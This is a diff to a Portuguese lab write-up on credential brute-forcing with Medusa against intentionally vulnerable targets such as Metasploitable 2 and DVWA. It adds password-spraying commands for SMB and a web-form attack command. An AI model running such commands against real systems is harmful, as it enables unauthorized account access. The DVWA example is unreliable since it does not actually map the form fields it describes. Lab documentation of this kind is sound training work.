@@ -54,6 +54,38 @@ Este teste explorou o serviço FTP do Metasploitable 2, que tipicamente não imp
 
 **Comando Medusa Utilizado:**
 
-```bash
+```
 # Tentativa com lista de usuários e lista de senhas
 medusa -H 192.168.56.102 -U /path/to/users.txt -P /path/to/passwords.txt -M ftp
+
+````
+
+### Cenário 2: Password Spraying em SMB
+
+O Password Spraying testa uma única senha comum em uma lista de múltiplos usuários, sendo eficiente para ambientes com políticas de lockout de contas.
+
+Serviço Alvo: SMB (Porta 445)
+
+Ataque: Password Spraying (uma senha contra muitos usuários).
+
+**Comando Medusa Utilizado:**
+
+
+````
+medusa -H [IP_ALVO] -U /path/to/users_smb.txt -p [SENHA_ÚNICA_FRACA] -M smb
+````
+
+### Cenário 3: Ataque a Formulário Web (DVWA)
+
+Simulação de ataque automatizado via HTTP POST contra a página de login de uma aplicação web vulnerável.
+
+Serviço Alvo: HTTP (Aplicação Web DVWA)
+
+Ataque: Força Bruta contra campos de formulário.
+
+**Comando Medusa Utilizado (Exemplo de Mapeamento):**
+
+````
+# Mapeamento do POST request para o Medusa, ajustando os parâmetros USER e PASS
+medusa -H [IP_ALVO] -U /path/to/users.txt -P /path/to/passwords.txt -M http -m DIR:/
+````
